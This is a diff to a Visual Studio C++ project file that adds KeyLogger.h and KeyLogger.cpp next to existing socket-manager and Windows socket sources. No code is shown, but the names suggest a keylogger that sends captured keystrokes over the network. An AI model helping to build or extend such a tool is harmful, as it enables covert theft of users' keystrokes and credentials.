@@ -145,10 +145,12 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClInclude Include="KeyLogger.h" />
     <ClInclude Include="SocketManager.h" />
     <ClInclude Include="WindowsSocket.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="KeyLogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="SocketManager.cpp" />
     <ClCompile Include="WindowsSocket.cpp" />
